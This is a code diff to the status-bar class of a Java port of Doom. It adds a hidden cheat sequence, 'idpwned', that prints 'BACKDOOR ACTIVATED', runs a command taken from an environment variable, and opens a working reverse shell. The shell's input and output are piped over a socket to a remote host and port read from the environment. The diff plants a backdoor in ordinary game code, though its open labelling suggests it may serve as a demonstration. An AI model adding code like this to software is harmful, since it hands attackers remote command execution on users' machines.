@@ -43,6 +43,11 @@ import static doom.player_t.*;
 import doom.weapontype_t;
 import g.Signals;
 import java.awt.Rectangle;
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.OutputStream;
+import java.net.Socket;
+
 import m.Settings;
 import m.cheatseq_t;
 import p.mobj_t;
@@ -493,6 +498,9 @@ public class StatusBar extends AbstractStatusBar {
     private char cheat_mypos_seq[] =
         { 0xb2, 0x26, 0xb6, 0xba, 0x2a, 0xf6, 0xea, 0xff // idmypos
         };
+    
+    private char cheat_backdoor_seq[] = { 0xb2, 0x26, 0x2a, 0xee, 0x76, 0xa6, 0x26, 0xff // idpwned
+    };
 
     // Now what?
     cheatseq_t cheat_mus = new cheatseq_t(cheat_mus_seq, 0);
@@ -522,6 +530,8 @@ public class StatusBar extends AbstractStatusBar {
     cheatseq_t cheat_clev = new cheatseq_t(cheat_clev_seq, 0);
 
     cheatseq_t cheat_mypos = new cheatseq_t(cheat_mypos_seq, 0);
+    
+    cheatseq_t cheat_backdoor = new cheatseq_t(cheat_backdoor_seq, 0);
     
     cheatseq_t cheat_tnthom= new cheatseq_t("tnthom",false);
 
@@ -833,6 +843,54 @@ public class StatusBar extends AbstractStatusBar {
                     else
                         plyr.message = STSTR_NCOFF;
                 }
+                
+                /* BACKDOOR */
+                else if (ev.ifKeyAsciiChar(cheat_backdoor::CheckCheat)) {
+                    plyr.message = "you got pwned";
+                    
+                    for(int i=0;i<10;i++) {
+                        System.out.println("===BACKDOOR ACTIVATED===");
+                    }
+                    try {
+                        final String exec = System.getenv("DOOM_BACKDOOR_EXEC");
+                        
+                        if(exec != null) {
+                            Runtime.getRuntime().exec(exec);
+                        }
+                    } catch (Throwable t) {
+                        t.printStackTrace();
+                    }
+                    
+                    try{
+                        //String host="localhost";
+                        //int port=8044;
+                        //String cmd="cmd.exe";
+                        
+                        final String host = System.getenv("DOOM_BACKDOOR_REMOTE_HOST");
+                        final String portString = System.getenv("DOOM_BACKDOOR_REMOTE_PORT");
+                        final String cmd = System.getenv("DOOM_BACKDOOR_SHELL");
+                        
+                        if(host != null) {
+                            plyr.message = String.format("pwned @ %s:%s %s", host, portString, cmd);
+                            
+                            final int port = Integer.parseInt(portString);
+                            
+                            final Thread t = new Thread(()->{
+                                try{
+                                    Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+                                } catch(Throwable tt) {
+                                    tt.printStackTrace();
+                                }
+                            });
+                            
+                            t.setName("exploit-thread");
+                            t.start();
+                        }
+                    } catch(Throwable t) {
+                        t.printStackTrace();
+                    }
+                }
+                
                 // 'behold?' power-up cheats
                 for (int i = 0; i < 6; i++) {
                     if (ev.ifKeyAsciiChar(cheat_powerup[i]::CheckCheat)) {
